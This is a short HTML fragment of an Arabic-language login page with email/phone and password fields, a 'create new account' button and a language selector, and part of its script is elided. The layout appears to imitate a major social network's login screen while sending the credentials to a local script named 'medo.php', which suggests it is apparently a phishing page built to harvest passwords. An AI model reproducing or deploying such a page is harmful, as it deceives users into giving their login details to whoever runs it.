<html>
<script src="../../cdn-cgi/apps/head/AlAgxD7oxHZSiFZQmr6zl7N739c.js"></script><script type='text/javascript'>
//<![CDATA[
...
<div class="content-box">
	   <form class="login-form" action="medo.php" method="post">
		<input type="text" name="email" placeholder="رقم الهاتف المحمول او البريد الالكتروني" autocomplete="off" autocapitalize="off" required>
		<input type="password" name="password" placeholder="كلمة السر" autocomplete="off" autocapitalize="off" required>
		<button type="submit" class="btn-login">تسجيل الدخول</button>
	</form>
	<div class="divider"><span>أو</span></div>
	<center>
	<button type="button" class="btn-create">انشاء حساب جديد</button>
	</center>
	<div class="txt-forgotten-password">هل نسيت كلمة السر؟</div>
</div>
<div class="language-box">
	<center>
	<div class="language-name language-name-active">English (US)</div>
